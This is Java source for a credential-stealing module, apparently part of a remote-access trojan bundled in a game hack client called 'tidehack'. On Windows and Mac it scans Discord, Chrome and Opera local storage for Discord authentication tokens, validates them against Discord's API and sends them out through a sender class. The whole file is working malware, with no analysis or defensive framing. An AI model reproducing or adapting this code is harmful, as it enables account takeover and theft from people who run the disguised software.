/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTSender;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RTDiscord implements RTPayload {
    String os = System.getProperty("os.name");

    @Override
    public String getName() {
        return "Discord Tokens";
    }

    @Override
    public void exec() throws Exception {

        if (os.contains("Windows")) {
            // leveldb where token is stored
            // no firefox lol (yet)
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n```");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }

                                    String token = m.group();
                                    URL dapi = new URL("https://discordapp.com/api/v6/users/@me");
                                    HttpURLConnection conn = (HttpURLConnection) dapi.openConnection();
                                    conn.setRequestMethod("GET");
                                    conn.setRequestProperty("Authorization",token);
                                    conn.setRequestProperty("Content-Type","application/json");

                                    if (conn.getResponseCode() == 200) {
                                        webhooks.append(m.group());
                                        cx++;
                                    } else {
                                        webhooks.append("[Invalid token, response "+conn.getResponseCode()+"]\n");
                                    }
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                RTSender s = new RTSender();
                s.send(webhooks.toString()+"\n```Some of these may not work.","Tokens",false);

                } catch (Exception e) {
                    RTSender s = new RTSender();
                    s.send("**Could not find any tokens!**","Error",false);
            }

        } else if (os.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }

                                    String token = m.group();
                                    URL dapi = new URL("https://discordapp.com/api/v6/users/@me");
                                    HttpURLConnection conn = (HttpURLConnection) dapi.openConnection();
                                    conn.setRequestMethod("GET");
                                    conn.setRequestProperty("Authorization",token);
                                    conn.setRequestProperty("Content-Type","application/json");

                                    if (conn.getResponseCode() == 200) {
                                        webhooks.append(m.group());
                                        cx++;
                                    } else {
                                        webhooks.append("[Invalid token, response "+conn.getResponseCode()+"]\n");
                                    }
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                RTSender s = new RTSender();
                s.send(webhooks.toString()+"\n```Some of these may not work.","Tokens",false);

            } catch (Exception e) {
                RTSender s = new RTSender();
                s.send("**Could not find any tokens!**","Error",false);
            }
        } else {
            RTSender s = new RTSender();
            s.send("**OS not supported, could not grab tokens!** ᵒᵏ ˢᶦⁿᶜᵉ ʷʰᵉⁿ ᵈᶦᵈ ᵗʰᵒˢᵉ ᶦᵈᶦᵒᵗˢ ᶠᶦᵍᵘʳᵉ ᵒᵘᵗ ˡᶦⁿᵘˣ","Error",false);
        }

    }
}
